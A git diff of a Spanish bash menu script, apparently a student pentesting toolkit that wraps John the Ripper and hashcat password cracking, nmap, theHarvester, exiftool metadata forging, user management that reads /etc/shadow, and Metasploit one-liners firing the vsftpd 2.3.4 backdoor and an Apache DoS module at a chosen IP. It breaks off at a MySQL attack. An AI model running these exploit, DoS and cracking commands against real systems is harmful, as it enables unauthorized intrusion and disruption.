@@ -2,20 +2,20 @@
 #Autor: Aimar Estebanez Gaston
 #bash-version:5.2.15(1)-release
 #Scrip para la ejecucion de diferentes herramientas.
-#FUNCIONES:
 
+#FUNCIONES:
 #Funcion test existencia fichero
 function fun_meta_edit(){
-	read -p "Introduzca la ruta del fichero: " pathFichero
+	read -rp "Introduzca la ruta del fichero: " pathFichero
 	until [[ -n $pathFichero && -f $pathFichero ]]; do
-		read -p "Introduzca la ruta del fichero: " pathFichero
+		read -rp "Introduzca la ruta del fichero: " pathFichero
 	done
 }
 
 #Funcion eleccion de parametros en exiftool
 function fun_meta_param(){
-	read -p "Introduzca el nuevo valor del parametro $1: " valorParametro
-	return $valorParametro 2>/dev/null	
+	read -rp "Introduzca el nuevo valor del parametro $1: " valorParametro
+	return "$valorParametro" 2>/dev/null
 }
 
 #Control de nombre de usuarios
@@ -24,10 +24,10 @@ function fun_ctrl_usu(){
 	while true; do
 		#Comprueba si usuario existe
 		if id "$nombre" >/dev/null 2>&1; then
-			echo $nombre
+			echo "$nombre"
 			break
 		else
-			read -p "ERROR: el usuario no existe, introduzca uno nuevo: " nombre
+			read -rp "ERROR: el usuario no existe, introduzca uno nuevo: " nombre
 		fi
 	done
 }
@@ -40,7 +40,7 @@ function fun_elec_dicc(){
 				clear
 				fun_menu_general "ATAQUE DE DICCIONARIO"
 				fun_menu_fingerprinting_dic "$(whoami)"
-				read -p "Indique el diccionario que desea emplear: " i_dic
+				read -rp "Indique el diccionario que desea emplear: " i_dic
 				
 				case $i_dic in 
 					1)#Password.lst
@@ -66,9 +66,9 @@ function fun_elec_dicc(){
 						fi
 					;;
 					3)#especifica la ruta
-						read -p "Introduzca la ruta del diccionario: " pathdiccionario
+						read -rp "Introduzca la ruta del diccionario: " pathdiccionario
 						until [[ -e $pathdiccionario ]]; do
-							read -p "Introduzca la ruta del diccionario: " pathdiccionario
+							read -rp "Introduzca la ruta del diccionario: " pathdiccionario
 						done
 						break
 					;;
@@ -81,8 +81,55 @@ function fun_elec_dicc(){
 					;;
 				esac
 			done
-			return $pathdiccionario 2>/dev/null
+			return "$pathdiccionario" 2>/dev/null
 	}
+
+#Funcion eleccion de algoritmo
+function fun_elec_algoritmo() {
+    i_algoritmo=0
+    while true
+    do
+      #[md5, sha1, sha256 o sha512]
+      clear
+      fun_menu_general "Eleccion de algoritmo"
+      fun_menu_ataque_dicci
+      read -rp "Introduzca una opcion: " i_algoritmo
+      case  $i_algoritmo in
+        1)#md5
+          formato="md5"
+          break
+        ;;
+        2)#sha1
+          formato="sha1"
+          break
+        ;;
+        3)#sha256
+          formato="sha256"
+          break
+        ;;
+        4)#sha512
+           formato="sha512"
+           break
+        ;;
+        *)
+          echo -e "${ROJO}ERROR: Opcion no valida${ND}"
+          sleep 0.5
+        ;;
+      esac
+    done
+    return "$formato" 2>/dev/null
+}
+#MENUS:
+#Menu eleccion de algortimo en 3.ataque
+function fun_menu_ataque_dicci() {
+
+  echo -e "${CIAN}1.${ND}MD5."
+	echo -e "${CIAN}2.${ND}SHA1."
+	echo -e "${CIAN}3.${ND}SHA256."
+	echo -e "${CIAN}4.${ND}SHA512."
+	echo -e "${ROJO}5.Volver atras.${ND} "
+	echo -e "${AZUL}========================${ND}"
+}
 
 #Menu ataque con metasploitable
 function fun_menu_msfconsole(){
@@ -94,6 +141,7 @@ function fun_menu_msfconsole(){
 	echo -e "${ROJO}5.Volver atras.${ND} "
 	echo -e "${AZUL}========================${ND}"
 }
+
 #Menu busqueda de ficheros
 function fun_menu_busqueda(){
 	echo -e "${CIAN}1.${ND}Busqueda con FIND."
@@ -146,8 +194,9 @@ function fun_menu_usr (){
 	fun_menu_general "Gestion de usuarios"
 	echo -e "${CIAN}1.${ND} Crear usuario."
 	echo -e "${CIAN}2.${ND} Editar Usuario."
-	echo -e "${CIAN}3.${ND} Eliminar usuario."	
-	echo -e "${ROJO}4.${ND} Volver atras."
+	echo -e "${CIAN}3.${ND} Eliminar usuario."
+	echo -e "${CIAN}4.${ND} Comprobar cambios de usuario."
+	echo -e "${ROJO}5.${ND} Volver atras."
 	echo -e "${AZUL}========================${ND}"
 }
 
@@ -178,7 +227,7 @@ function fun_menu_metasploit_edit(){
 	echo -e "${CIAN}5.${ND}Modificar FECHA DE CREACION."
 	echo -e "${ROJO}6.Volver atras.${ND}"
 	echo -e "${AZUL}========================${ND}"
-	read -p $'\e[33mElige una opcion\e[0m: ' i_editar	
+	read -rp $'\e[33mElige una opcion\e[0m: ' i_editar
 }
 
 #Menu exiftool
@@ -203,7 +252,7 @@ function fun_menu_general (){
  function fun_menu_principal (){	 
 	clear
 	#Parte bonita menu
-	figlet -f Big.flf menu
+	figlet -f Big.flf menu | lolcat
 	echo -e "${AZUL}========================${ND}"
 	echo -e "--------- ${AZUL}MENU${ND} ---------"
 	echo -e "${AZUL}========================${ND}"
@@ -219,17 +268,14 @@ function fun_menu_general (){
 }
 
 #Variables para colorear
-NARANJA='\033[0;33m'
 AZUL='\033[0;34m'
 CIAN='\033[0;36m'
 ROJO='\033[0;31m'
 ND='\033[0m' # nada	
 
+#Instalacion de dependencias
 
-#Script:
-
-#Comprobacion Instalacion de paquetes
-read -p "Quiere instalar las dependencias? (s/n)" dependencias
+read -rp "Quiere instalar las dependencias? (s/n)" dependencias
 if [ "$dependencias" = "s" ] || [ "$dependencias" = "S" ]
 then 
 	echo "Instalando dependencias"
@@ -246,13 +292,12 @@ then
 	sudo apt install -y libimage-exiftool-perl
 	sudo apt install -y theharvester
 	sudo apt install -y metasploit-framework
+	sudo apt install -y finger
+	sudo apt install -y lolcat
 	read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla			
 fi
 
-
-
-#Funcionalidad Principal
-
+#Script:
 #Bucle principal del programa
 i=0
 while true
@@ -260,15 +305,15 @@ do
 	fun_menu_principal 
 	
 	#Bucle control valor variable i dentro de parametros
-		read -p $'\e[33mElige una opcion\e[0m: ' i
+		read -rp $'\e[33mElige una opcion\e[0m: ' i
 	case $i in
 		1) #Saludar
 			# Elige una de las dos condiciones de manera aleatoria	
 			if (( RANDOM % 2 )); 
 			then 
-				figlet -f Fuzzy.flf Hola campeon
+				figlet -f Fuzzy.flf Hola campeon | lolcat
 			else 
-				figlet -f maxiwi.flf Deja de tocar pesao
+				figlet -f maxiwi.flf Deja de tocar pesao | lolcat
 			fi
 			
 			# Confirmacion para avanzar
@@ -281,35 +326,35 @@ do
 				clear
 				fun_menu_general "Busqueda de ficheros"
 				fun_menu_busqueda
-				read -p $'\e[33mElige una opcion\e[0m: ' i_fich
+				read -rp $'\e[33mElige una opcion\e[0m: ' i_fich
 				case $i_fich in
 					1)#Busqueda con find
 						echo "BUSCANDO CON FIND: "
-						read -p "Intrduzca el nombre del fichero que desea encontrar: " nombrefichero
-						find / -name *$nombrefichero* 2>/dev/null
+						read -rp "Intrduzca el nombre del fichero que desea encontrar: " nombrefichero
+						find / -name "*$nombrefichero*" 2>/dev/null
 						
 						# Confirmacion para avanzar
 						read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla	
 					;;
 					2)#Busqueda con locate
 						echo "BUSCANDO CON LOCATE:"
-						read -p "Intrduzca el nombre del fichero que desea encontrar: " nombrefichero
+						read -rp "Intrduzca el nombre del fichero que desea encontrar: " nombrefichero
 						sudo updatedb 2>/dev/null
-						locate -i $nombrefichero 2>/dev/null
+						locate -i "$nombrefichero" 2>/dev/null
 						# Confirmacion para avanzar
 						read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla	
 					;;
 					3)#Busqueda Ejecutable con which 
 						echo "BUSCANDO EJECUTABLE CON WHICH:"
-						read -p "Intrduzca el nombre del ejecutable que desea encontrar: " nombrefichero
-						sudo which $nombrefichero 2>/dev/null
+						read -rp "Intrduzca el nombre del ejecutable que desea encontrar: " nombrefichero
+						sudo which "$nombrefichero" 2>/dev/null
 						# Confirmacion para avanzar
 						read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla	
 					;;
 					4)#Busqueda con whereis
 						echo "BUSCANDO EJECUTABLE CON WHEREIS:"
-						read -p "Intrduzca el nombre del ejecutable que desea encontrar: " nombrefichero
-						sudo whereis $nombrefichero 2>/dev/null
+						read -rp "Intrduzca el nombre del ejecutable que desea encontrar: " nombrefichero
+						sudo whereis "$nombrefichero" 2>/dev/null
 						# Confirmacion para avanzar
 						read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla	
 					;;
@@ -317,7 +362,7 @@ do
 						break
 					;;
 					*)
-						echo "Opcion no valida"
+						echo -e "${ROJO}ERROR: Opcion no valida${ND}"
 						sleep 0.5
 					;;
 				esac
@@ -330,11 +375,12 @@ do
 				clear
 				fun_menu_general "ATAQUE DE DICCIONARIO "
 				fun_menu_fingerprinting_atac 
-				read -p $'\e[33mElige una opcion\e[0m: ' i_ataque
+				read -rp $'\e[33mElige una opcion\e[0m: ' i_ataque
 				case $i_ataque in
 					1)#Creacion del hash
-						read -p "Introduzca la cadena a HASH-ar: " cadena
-						echo -n $cadena | md5sum | awk '{print $1}' > temp.txt  #Fichero temporal
+						read -rp "Introduzca la cadena a HASH-ar: " cadena
+						fun_elec_algoritmo
+						echo -n "$cadena" | "$formato"sum | awk '{print $1}' > temp.txt  #Fichero temporal
 						cat temp.txt
 						vhash=$(cat temp.txt) 		
 						# Confirmacion para avanzar
@@ -342,23 +388,23 @@ do
 					;;
 					2)#Ataque con JOHN 
 						#Comprobacion del tipo de encriptacion
-						hashid -m $vhash
+						hashid -m "$vhash"
 						#Control valor variable formato
-						read -p "Introduzca el algoritmo [md5, sha1, sha256 o sha512]: " formato
+						read -rp "Introduzca el algoritmo [md5, sha1, sha256 o sha512]: " formato
 						while [[ "$formato" != "md5" && "$formato" != "sha1" && "$formato" != "sha256" && "$formato" != "sha512" ]]
 						do
 							echo -e "${ROJO}Opcion incorrecta, introduzca uno de los especificados${ND}"
-							read -p "Introduzca el algoritmo [md5, sha1, sha256 o sha512]: " formato
+							read -rp "Introduzca el algoritmo [md5, sha1, sha256 o sha512]: " formato
 						done 
 						
 						fun_elec_dicc 
 						
 						#Ataque de diccionario
-						john --wordlist=$pathdiccionario --format=Raw-$formato temp.txt 2>&1>/dev/null
-						resultado=$(john --show temp.txt --format=Raw-$formato | cut -d ":" -f2)
+						john --wordlist="$pathdiccionario" --format=Raw-"$formato" temp.txt 2>&1
+						resultado=$(john --show temp.txt --format=Raw-"$formato" | cut -d ":" -f2)
 						
 						#Resultado
-						echo "La contrasenia es: $resultado" > $(date '+%F-%H-%S')_resultado.txt
+						echo "La contrasenia es: $resultado" > "$(date '+%F-%H-%S')"_resultado.txt
 						echo "La contrasenia es: $resultado"
 					
 						
@@ -369,7 +415,7 @@ do
 					
 						fun_elec_dicc
 						
-						hashcat -m 0 -a 0 temp.txt $pathdiccionario |grep $vhash| awk -F: '{print "La contrasenia es: " $2}'| grep -v '^$'| head -n 1 > resultado.txt
+						hashcat -m 0 -a 0 temp.txt "$pathdiccionario" |grep "$vhash"| awk -F: '{print "La contrasenia es: " $2}'| grep -v '^$'| head -n 1 > resultado.txt
 						cat resultado.txt
 						# Confirmacion para avanzar
 						read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla	
@@ -378,19 +424,14 @@ do
 						break
 					;;
 					*)
-						echo "Opcion no valida"
-						seleep 0.5
+						echo -e "${ROJO}ERROR: Opcion no valida${ND}"
+						sleep 0.5
 					;;
-					
 				esac
 			done
-			rm -f temp.txt 2>&1>/dev/null
-			#827ccb0eea8a706c4c34a16891f84e7b
-			#311020666a5776c57d265ace682dc46d
-			#8afa847f50a716e64932d995c8e7435a
+			rm -f temp.txt 2>&1
 		;;
 		4) #Fingerprint
-			
 			i_finger=0
 			while true
 			do
@@ -398,27 +439,27 @@ do
 				#Menu fingerprint
 				fun_menu_general "Fingerprint"
 				fun_menu_fingerprinting
-				read -p $'\e[33mElige una opcion\e[0m: ' i_finger 
+				read -rp $'\e[33mElige una opcion\e[0m: ' i_finger 
 				
 				case $i_finger in
 					1)#NMAP
 						fun_menu_general "NMAP"
-						read -p "Especifique el objetivo: " objetivo_nmap
+						read -rp "Especifique el objetivo: " objetivo_nmap
 						#Control varible parametros
-						read -p "Introduzca el algoritmo [ sX, sC, sV  o sN ]: " parametros
+						read -rp "Introduzca el algoritmo [ sX, sC, sV  o sN ]: " parametros
 						while [[ "$parametros" != "sX" && "$parametros" != "sC" && "$parametros" != "sV" && "$parametros" != "sN" ]]
 						do
 							echo -e "${ROJO}Opcion incorrecta, introduzca uno de los especificados${ND}"
-							read -p "Introduzca el algoritmo [ sX, sC, sV  o sN ]: " parametros
+							read -rp "Introduzca el algoritmo [ sX, sC, sV  o sN ]: " parametros
 						done 
 						
 						echo "Puertos abiertos de la IP: $objetivo_nmap"
 						ficheronmap=$(date '+%F-%H-%S')nmap__resultado.txt
-						echo "PORT     STATE SERVICE      VERSION" > $ficheronmap
+						echo "PORT     STATE SERVICE      VERSION" > "$ficheronmap"
 						#Ejecucion comando nmap
 						#sudo nmap -$parametros $objetivo_nmap | egrep -e [0-9][0-9]*/ >> $ficheronmap
-						sudo nmap -$parametros $objetivo_nmap | grep open >> $ficheronmap
-						cat $ficheronmap
+						sudo nmap -"$parametros" "$objetivo_nmap" | grep open >> "$ficheronmap"
+						cat "$ficheronmap"
 						# Confirmacion para avanzar
 						read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla	
 					;;
@@ -428,7 +469,7 @@ do
 						read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
 					;;
 					3)#Detener OpenVas
-						sudo gvm-stop 2>&1>/dev/null
+						sudo gvm-stop 2>&1
 						echo "Openvas detenido"
 						read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
 					;;
@@ -436,14 +477,11 @@ do
 						break
 					;;
 					*)
-						echo "Opcion no valida"
+						echo -e "${ROJO}ERROR: Opcion no valida${ND}"
 						seleep 0.5
 					;;
 				esac
 			done
-						
-									
-					
 		;;
 		5) #Footprinting			
 			i_metadatos=0
@@ -451,7 +489,7 @@ do
 			do
 				fun_menu_general "FOOTPRINTING"
 				fun_menu_footprintin
-				read -p $'\e[33mElige una opcion\e[0m: ' i_metadatos 
+				read -rp $'\e[33mElige una opcion\e[0m: ' i_metadatos 
 				case $i_metadatos in
 					1)
 						echo "CONSULTAR METADATOS"
@@ -461,24 +499,24 @@ do
 						do
 							fun_menu_general "FOOTPRINTING"
 							fun_menu_metasploit_show
-							read -p $'\e[33mElige una opcion\e[0m: ' i_exif
+							read -rp $'\e[33mElige una opcion\e[0m: ' i_exif
 							#Case para las funcionalidades del menu
 							case $i_exif in
 								1)#Metadatos de la ruta actual
 									echo "Mostrando los metadatos de los archivos de la ruta actual:"
-									exiftool *			
+									exiftool ""*
 									# Confirmacion para avanzar
 									read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
 								;;
 								2)#Metadatos de la ruta especifica
-									read -p "ESpecifique la ruta de la cual quiera obterner los metadatos: " ruta_metadatos
-									exiftool $ruta_metadatos/ *			
+									read -rp "ESpecifique la ruta de la cual quiera obterner los metadatos: " ruta_metadatos
+									exiftool "$ruta_metadatos"/*
 									# Confirmacion para avanzar
 									read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
 								;;
 								3)#Metadatosm de fichero especifico
-									read -p "Especifique el fichero del cual quiera obterner los metadatos: " fichero_metadatos
-									exiftool -U $fichero_metadatos			
+									read -rp "Especifique el fichero del cual quiera obterner los metadatos: " fichero_metadatos
+									exiftool -U "$fichero_metadatos"
 									# Confirmacion para avanzar
 									read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
 								;;
@@ -490,7 +528,7 @@ do
 									break
 								;;
 								*)
-									echo "ERROR: OPCION NO CONTEMPLADA"
+									echo -e "${ROJO}ERROR: Opcion no valida${ND}"
 									sleep 0.5
 								;;
 							esac
@@ -507,38 +545,38 @@ do
 								1)#Eliminar todos
 									
 									fun_meta_edit
-									exiftool -all= $pathFichero
+									exiftool -all= "$pathFichero"
 									read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
 								;;	
 								2)#Editar CREATOR
 									fun_meta_edit
 									fun_meta_param "CREADOR"
-									sudo exiftool -creator=$valorParametro $pathFichero
+									sudo exiftool -creator="$valorParametro" "$pathFichero"
 									read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
 								;;
 								3)#Editar AUTHOR
 									fun_meta_edit
 									fun_meta_param "AUTOR"
-									sudo exiftool -author=$valorParametro $pathFichero
+									sudo exiftool -author="$valorParametro" "$pathFichero"
 									read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
 								;;
 								4)#Editar LANGUAGE
 									fun_meta_edit
 									fun_meta_param "IDIOMA"
-									sudo exiftool -language=$valorParametro $pathFichero
+									sudo exiftool -language="$valorParametro" "$pathFichero"
 									read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
 								;;
 								5)#Editar CREATE DATE
 									fun_meta_edit
 									fun_meta_param "FECHA DE CREACION"
-									sudo exiftool -createdate=$valorParametro $pathFichero
+									sudo exiftool -createdate="$valorParametro" "$pathFichero"
 									read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
 								;;
 								6)#VolverAtras
 									break
 								;;
 								*)
-									echo "Opcion no valida"
+									echo -e "${ROJO}ERROR: Opcion no valida${ND}"
 									sleep 0.5
 								;;
 							esac
@@ -547,25 +585,25 @@ do
 					3)#THE HARVESTER
 						fun_menu_general "THE HARVESTER"
 						
-						read -p "Introduzca el dominio objetivo: " dominioObjetivo
+						read -rp "Introduzca el dominio objetivo: " dominioObjetivo
 						
-						read -p "Introduzca el algoritmo [ bing, brave, yahoo o duckduckgo ]: " buscador
+						read -rp "Introduzca el algoritmo [ bing, brave, yahoo o duckduckgo ]: " buscador
 						while [[ "$buscador" != "bing" && "$buscador" != "brave" && "$buscador" != "yahoo" && "$buscador" != "duckduckgo" ]]
 						do
 							echo -e "${ROJO}Opcion incorrecta, introduzca uno de los especificados${ND}"
-							read -p "Introduzca el algoritmo [ bing, brave, yahoo o duckduckgo ]: " buscador
+							read -rp "Introduzca el algoritmo [ bing, brave, yahoo o duckduckgo ]: " buscador
 						done 
 						
-						read -p "Introduzca la cantidad de busquedas que desea hacer: " numeroBusquedas
+						read -rp "Introduzca la cantidad de busquedas que desea hacer: " numeroBusquedas
 						
-						sudo theHarvester -d $dominioObjetivo -l $numeroBusquedas -b $buscador
+						sudo theHarvester -d "$dominioObjetivo" -l "$numeroBusquedas" -b "$buscador"
 						read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
 					;;
 					4)
 						break
 					;;
 					*)
-						echo "OPCION NO VALIDA"
+						echo -e "${ROJO}ERROR: Opcion no valida${ND}"
 						sleep 0.5
 					;;
 				esac
@@ -577,25 +615,24 @@ do
 			while true
 			do
 				fun_menu_usr
-				read -p $'\e[33mElige una opcion\e[0m: ' i_usu
+				read -rp $'\e[33mElige una opcion\e[0m: ' i_usu
 				case $i_usu in
 					1)#Creacion de usuario
 						fun_menu_general "Ceracion de usuario"
 					
-						read -p "Introduzca el nombre de usuario: " nombreusuario
-						read -sp "Introduzca la contrasenia: " contrasena
-						echo " "
-						read -sp "Repita la contrasenia: " contrasena2
+						read -rp "Introduzca el nombre de usuario: " nombreusuario
+						read -rsp "Introduzca la contrasenia: " contrasena
+						echo -e '\n'
+						read -rsp "Repita la contrasenia: " contrasena2
 						
 						#Comprobacion contrasenia
 						if [ "$contrasena" = "$contrasena2" ]
 						then 
-							contrasena=$(openssl passwd $contrasena)
-							sudo useradd $nombreusuario --password $contrasena					
+							contrasena=$(openssl passwd "$contrasena")
+							sudo useradd "$nombreusuario" --password "$contrasena"
 						else
 							echo "Las contrasenas no coinciden"
 						fi
-					
 						# Confirmacion para avanzar
 						read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
 					;;
@@ -605,16 +642,16 @@ do
 						while true
 						do 
 							fun_menu_usr_mod
-							read -p $'\e[33mElige una opcion\e[0m: ' i_usu_mod
+							read -rp $'\e[33mElige una opcion\e[0m: ' i_usu_mod
 							case $i_usu_mod in
 							1) #Cambio de nombre 
-								read -p "Introduzca el nombre del usuario que desea modificar: " nombreviejo
+								read -rp "Introduzca el nombre del usuario que desea modificar: " nombreviejo
 								
 								#Comprovacion si usuario existe
 								nombreviejo=$(fun_ctrl_usu "$nombreviejo")
-								read -p "Introduzca el nuevo nombre de usuario: " nuevonombre
+								read -rp "Introduzca el nuevo nombre de usuario: " nuevonombre
 								
-								sudo usermod -l $nuevonombre $nombreviejo
+								sudo usermod -l "$nuevonombre" "$nombreviejo"
 								echo "NOMBRE DE USUARIO ACTUALIZADO"
 				
 								# Confirmacion para avanzar
@@ -622,31 +659,31 @@ do
 							;;
 							2)#Cambiar HOME
 								#Comprovacion si usuario existe
-								read -p "Introduzca el nombre del usuario que desea modificar: " nombreusu
+								read -rp "Introduzca el nombre del usuario que desea modificar: " nombreusu
 								nombreusu=$(fun_ctrl_usu "$nombreusu")
 								
 								#Comprovacion directorio existe
-								read -p "Introduzca la ruta del nuevo home del usuario: " nuevohome
+								read -rp "Introduzca la ruta del nuevo home del usuario: " nuevohome
 								until [[ -n $nuevohome && -d $nuevohome ]]; do
-									read -p "Introduzca la ruta del nuevo home del usuario: " nuevohome
+									read -rp "Introduzca la ruta del nuevo home del usuario: " nuevohome
 								done
 								
 								#Cambio
-								sudo usermod --home $nuevohome $nombreusu
+								sudo usermod --home "$nuevohome" "$nombreusu"
 								# Confirmacion para avanzar
 								read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
 							;;
 							3)#Fecha caducidad
 								#Comprovacion si usuario existe
-								read -p "Introduzca el nombre del usuario que desea modificar: " nombreusu
+								read -rp "Introduzca el nombre del usuario que desea modificar: " nombreusu
 								nombreusu=$(fun_ctrl_usu "$nombreusu")
 								
 								#Comprovacion fecha en formato YYYY-MM-DD
-								read -p "Introduzca la nueva fecha de caducidad en formato YYYY-MM-DD: " fechacad
+								read -rp "Introduzca la nueva fecha de caducidad en formato YYYY-MM-DD: " fechacad
 								if [[ $fechacad =~ ^[0-9]{4}-[0-9]{2}-[0-9]{2}$ ]] && date -d "$fechacad" >/dev/null 2>&1
 								then
 									echo "Modificando usuario: "
-									sudo usermod --expiredate $fechacad $nombreusu
+									sudo usermod --expiredate "$fechacad" "$nombreusu"
 								else 
 									echo "Fecha no valida o en formato incorrecto"
 								fi
@@ -657,31 +694,31 @@ do
 							;;
 							4)#Añadir a grupo
 								#Comprovacion si usuario existe
-								read -p "Introduzca el nombre del usuario que desea modificar: " nombreusu
+								read -rp "Introduzca el nombre del usuario que desea modificar: " nombreusu
 								nombreusu=$(fun_ctrl_usu "$nombreusu")
 								
-								read -p "Introduzca los grupos a los que quiere añadir: " grupos 
-								sudo usermod -a --groups $grupos $nombreusu
+								read -rp "Introduzca los grupos a los que quiere añadir: " grupos 
+								sudo usermod -a --groups "$grupos" "$nombreusu"
 								
 								# Confirmacion para avanzar
 								read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
 							;;
 							5)#Contraseña
 								#Comprovacion si usuario existe
-								read -p "Introduzca el nombre del usuario que desea modificar: " nombreusu
+								read -rp "Introduzca el nombre del usuario que desea modificar: " nombreusu
 								nombreusu=$(fun_ctrl_usu "$nombreusu")
 								
 								#Peticion de contraseñas a usuario	
-								read -sp "Introduzca la contrasenia: " contrasena
+								read -rsp "Introduzca la contrasenia: " contrasena
 								echo " "
-								read -sp "Repita la contrasenia: " contrasena2
+								read -rsp "Repita la contrasenia: " contrasena2
 								echo ""
 								
 								#Comprobacion contrasenia
 								if [ "$contrasena" = "$contrasena2" ]
 								then 
-									contrasena=$(openssl passwd $contrasena)
-									sudo usermod --password $contrasena $nombreusu					
+									contrasena=$(openssl passwd "$contrasena")
+									sudo usermod --password "$contrasena" "$nombreusu"
 								else
 									echo "Las contrasenas no coinciden"
 								fi
@@ -691,37 +728,37 @@ do
 							6)#Cambio de shell
 
 								#Comprovacion si usuario existe
-								read -p "Introduzca el nombre del usuario que desea modificar: " nombreusu
+								read -rp "Introduzca el nombre del usuario que desea modificar: " nombreusu
 								nombreusu=$(fun_ctrl_usu "$nombreusu")
 								
 								#Comprovacion de shell correcta
-								read -p "Introduzca la nueva shell para el usuario [/bin/bash, /bin/sh, /bin/zsh]: " nuevashell
+								read -rp "Introduzca la nueva shell para el usuario [/bin/bash, /bin/sh, /bin/zsh]: " nuevashell
 								while [[ "$nuevashell" != "/bin/bash" && "$nuevashell" != "/bin/sh" && "$nuevashell" != "/bin/zsh" ]]
 								do
 									echo -e "${ROJO}Opcion incorrecta, introduzca una de los especificados${ND}"
-									read -p "Introduzca la nueva shell para el usuario [/bin/bash, /bin/sh, /bin/zsh]: " nuevashell
+									read -rp "Introduzca la nueva shell para el usuario [/bin/bash, /bin/sh, /bin/zsh]: " nuevashell
 								done 
 								
-								sudo usermod --shell $nuevashell $nombreusu 
+								sudo usermod --shell "$nuevashell" "$nombreusu"
 								# Confirmacion para avanzar
 								read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
 							;;
 							7)#Bloquear	
 								#Comprovacion si usuario existe
-								read -p "Introduzca el nombre del usuario que desea modificar: " nombreusu
+								read -rp "Introduzca el nombre del usuario que desea modificar: " nombreusu
 								nombreusu=$(fun_ctrl_usu "$nombreusu")
 								
-								sudo usermod --lock $nombreusu
+								sudo usermod --lock "$nombreusu"
 								
 								# Confirmacion para avanzar
 								read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
 							;;
 							8)#Desbloquear	
 								#Comprovacion si usuario existe
-								read -p "Introduzca el nombre del usuario que desea modificar: " nombreusu
+								read -rp "Introduzca el nombre del usuario que desea modificar: " nombreusu
 								nombreusu=$(fun_ctrl_usu "$nombreusu")
 								
-								sudo usermod --unlock $nombreusu
+								sudo usermod --unlock "$nombreusu"
 						
 								# Confirmacion para avanzar
 								read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
@@ -730,7 +767,7 @@ do
 								break
 							;;
 							*)
-								echo "ERROR: OPCION NO CONTEMPLADA"
+								echo -e "${ROJO}ERROR: Opcion no valida${ND}"
 								sleep 0.5
 							;;
 							esac
@@ -738,24 +775,34 @@ do
 					;;
 					3)#Eliminacion de usuario
 						fun_menu_general "Eliminar usuario"
-						read -p "Introduzca el nombre de usuario que desea eliminar: " nombreusuario
+						read -rp "Introduzca el nombre de usuario que desea eliminar: " nombreusuario
 						
 						#Confirmacion de eliminacion de usuario
-						read -p "CONFIRMACION: realmente quiere eliminar el usuario? (s/n)" confirmacion
+						read -rp "CONFIRMACION: realmente quiere eliminar el usuario? (s/n)" confirmacion
 						if [ "$confirmacion" = "s" ] || [ "$confirmacion" = "S" ]
-						then 
-							sudo userdel $nombreusuario
+						then
+							sudo userdel "$nombreusuario"
 						else
 							echo "Operacion abortada"
 						fi
 						# Confirmacion para avanzar
 						read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
 					;;
-					4)
-						break
+					4)#Comprobacion de cambios de usuarios
+            fun_menu_general "Cambios en usuarios"
+            read -rp "Introduzca el nombre del usuario que desea comprobar: " nombreusu
+            nombreusu=$(fun_ctrl_usu "$nombreusu")
+            sudo cat /etc/passwd | grep "$nombreusu"
+            sudo cat /etc/shadow | grep "$nombreusu"
+            sudo cat /etc/group | grep "$nombreusu"
+            finger "$nombreusu"
+            read -rsp $'Pulsa cualquier tecla para continuar...\n' -n1 tecla
 					;;
+			    5)
+			      break
+			    ;;
 					*)
-						echo "ERROR: OPCION NO CONTEMPLADA"
+						echo -e "${ROJO}ERROR: Opcion no valida${ND}"
 						sleep 0.5
 					;;
 				esac
@@ -770,13 +817,13 @@ do
 			do
 				fun_menu_general "Ataque con MSFCONSOLE"
 				fun_menu_msfconsole 
-				read -p $'\e[33mElige una opcion\e[0m: ' i_msfconsole
+				read -rp $'\e[33mElige una opcion\e[0m: ' i_msfconsole
 				
 				case $i_msfconsole in
 					1)#VSFTPD
 						#Definicion de las variables
-						read -p "Especifica la ip objetivo: " ipObjetivo
-						read -p "Especifica el puerto: " puertObjetivo
+						read -rp "Especifica la ip objetivo: " ipObjetivo
+						read -rp "Especifica el puerto: " puertObjetivo
 						#Ataque desde mfconsole
 						msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor;set payload cmd/unix/interact; set RHOSTS $ipObjetivo; set RPORT $puertObjetivo; run; exit "
 						
@@ -784,9 +831,9 @@ do
 					;;
 					2)#Apache DoS
 						#Definicion de las variables
-						read -p "Especifica la ip objetivo: " ipObjetivo						
-						read -p "Especifica la cantidad de paquetes a enviar: " cantidadPaquetes
-						read -p "Especifica el puerto: " puertObjetivo
+						read -rp "Especifica la ip objetivo: " ipObjetivo						
+						read -rp "Especifica la cantidad de paquetes a enviar: " cantidadPaquetes
+						read -rp "Especifica el puerto: " puertObjetivo
 						#Ataque desde mfconsole
 						msfconsole -q -x "dos/http/apache_commons_fileupload_dos;set payload cmd/unix/interact; set RHOSTS $ipObjetivo; set RLIMIT $cantidadPaquetes ; set RPORT $puertObjetivo; run; exit "
 						
@@ -794,8 +841,8 @@ do
 					;;
 					3)#Ataque a MySQL
 						#Definicion de las variables
-						read -p "Especifica la ip objetivo: " ipObjetivo
-						read -p "Especifica el puerto: " puertObjetivo
+						read -rp "Especifica la ip objetivo: " ipObjetivo
+						read -rp "Especifica el puerto: " puertObjetivo
 						#Ataque desde mfconsole
